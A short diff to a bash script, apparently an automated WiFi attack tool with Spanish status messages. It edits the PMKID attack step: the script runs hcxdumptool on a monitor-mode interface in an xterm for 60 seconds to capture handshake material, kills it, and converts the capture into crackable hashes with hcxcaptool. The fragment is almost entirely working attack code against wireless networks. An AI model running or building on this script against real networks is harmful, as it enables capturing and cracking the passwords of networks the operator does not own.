@@ -123,7 +123,9 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								2)
 								echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
 								sleep 1 
-								timeout 60 bash -c "hcxdumptool -i ${tar}mon --enable_status=1 -o Hash" &
+								xterm -hold -e "hcxdumptool -i ${tar}mon --enable_status=1 -o Hash" &
+								hcxcaptool_PID=$!
+								sleep 60; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID
 								echo -e "\n${redColour} [%] Capturando Hashes\n"
 								sleep 2
 								hcxcaptool -z Hashes Hash; rm Hash 2>/dev/null
